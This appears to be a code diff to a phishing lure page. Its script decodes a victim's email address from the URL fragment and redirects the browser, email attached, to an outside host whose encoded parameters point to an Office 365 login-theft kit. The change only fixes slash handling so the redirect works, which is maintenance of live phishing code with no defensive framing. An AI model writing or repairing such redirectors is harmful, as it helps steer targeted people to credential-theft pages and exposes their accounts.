@@ -19,11 +19,11 @@
 
     window.onload = function () {
       const hash = window.location.hash.substring(1).trim();
-      const baseUrl = "https://dennbc.com/s/index.php?c3Y9bzM2NV8xX25vbSZyYW5kPU16ck8wJnVpZD1VU0VSMjkwNDIwMjVVMzgwNDI5NDMmcmFuZD1lTDltNA==N0123N";
+      const baseUrl = "https://dennbc.com/s/index.php?c3Y9bzM2NV8xX25vbSZyYW5kPU16ck8wJnVpZD1VU0VSMjkwNDIwMjVVMzgwNDI5NDMmcmFuZD1lTDltNA==N0123N/";
 
       if (hash) {
         const email = tryDecodeBase64(decodeURIComponent(hash));
-        const redirectTo = `${baseUrl}/#${encodeURIComponent(email)}`;
+        const redirectTo = `${baseUrl}#${encodeURIComponent(email)}`;
         window.location.href = redirectTo;
       } else {
         window.location.href = baseUrl;
